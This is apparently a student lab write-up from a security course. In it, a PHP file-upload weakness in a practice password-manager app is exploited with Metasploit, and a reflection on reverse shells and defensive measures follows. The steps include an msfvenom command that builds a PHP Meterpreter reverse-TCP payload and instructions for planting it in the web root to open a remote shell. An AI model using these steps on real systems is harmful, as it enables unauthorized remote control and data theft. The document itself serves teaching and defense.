# W6 | Offensive Security

## Introduction  
We've built the walls. Now it’s time to think like someone trying to break through them.

In this lab, we’ll take on the role of an attacker exploiting a vulnerability in the HusKey Manager app. Using **Metasploit** we’ll craft and deliver a **payload** to gain unauthorized remote access to the target machine. We’ll then interact with the compromised system just like a real world attacker would.

We’ll:
- Identify an exploitable weakness in the web app
- Generate a custom payload using **msfvenom**
- Use **Metasploit** to open a reverse shell to the compromised target

This lab is your first real taste of offensive security essential knowledge for understanding how attackers think and how to build defenses that stop them.


## Steps
1. Identify the vulnerability in the password manager system. (Commonly done with reconnaissance techniques)
2. Open Docker and spin up two terminals: one deploying the password manager, one deploying Metasploit with the command docker run --rm -it -p 4444:4444 metasploitframework/metasploit-framework. Confirm a unique ASCII image and LHOST was created. 
3. Before creating the payload, run this command(saved as load.php in webapp) to ensure a php file can be run on the server ``` <?php$files = scandir(getcwd()); print_r($files);?>```
4. In the Metasploit terminal, run this command to create the payload. /usr/src/metasploit-framework/msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your EXTERNAL IP address> LPORT=4444 -f raw
5. Once the payload loads, remove the long comment tag <?php ... ?> before the payload and save the raw code in a text editor as reverse_tcp.php
6. Select the payload in the msfconsole with command use php/meterpreter/reverse_tcp and confirm the LHOST and LPORT match your metasploit container's IP address and the appropriate port (4444).
7. Enter command exploit to start listening in for connections from victim’s machine 
8. Move the reverse_tcp.php under the public folder of the webapp so the web server executes the PHP file.
9. Once the payload runs, enter sessions -l for listing all active connections
10. Enter sessions -l <ID> i.e. sessions -l 1 to connect to a specific session.
11. Once connected, use the command prompt to access files, run commands and find sensitive information.
<img width="70%" alt="image" src="https://github.com/user-attachments/assets/c496474e-7dae-4442-ab97-9644cdd5383c" />

*Confirm LHOST, LPORT before launching payload*

<img width="70%" alt="image" src="https://github.com/user-attachments/assets/29defdd7-06d8-46e3-ac1c-d217cdee35bb" />

*Command prompt displayed for Session ID 1*

## Reflection
Msfvenom creates Meterpreter, a PHP payload that’s executed on the Password Manager. It establishes a reverse TCP connection from the victim’s machine back to my attacking machine(LHOST IP address, LPORT 4444). Once the connection is established the payload provides an interactive shell that executes commands and control’s the victim’s machine remotely. Meterpreter is the active component of the attack, so it’s the malware itself that **translates the identified vulnerability into actual control** over the target.

**A handler is needed for the REVERSE_TCP payload to work properly**. Since the payload programs the victim’s machine to initiate a connection back to us(attacker) rather than us initiating a connection to the victim(often blocked by firewalls), handlers act as a listening server accepting incoming connections from the victim. When the EXPLOIT command is run, it starts the handler and tells Metasploit to open up that port on our machine and wait for the victim’s payload to connect. In other words, if there’s no listener, there’s no connection.

Based on the lab the hacker mindset is clearly demonstrated through contrarian thinking (identifying unexpected entry points through PHP file uploads), commitment (methodically working through multiple steps to gain access), and creativity (crafting custom payload to establish a reverse connection). The key defensive lessons are about input validation and permission restrictions. To prevent such attacks, you would need to implement strict file upload validation to reject executable code like PHP scripts, properly configure server permissions to limit execution rights, regularly update systems to patch vulnerabilities, and implement defense-in-depth strategies where multiple security layers must be breached to access sensitive data. Understanding how attackers think and operate provides essential insight needed to build more secure defenses against sophisticated attacks.

<img width="50%" alt="image" src="https://github.com/user-attachments/assets/ebffd8f1-4bd7-40be-a0f1-2be03a36ace0" />
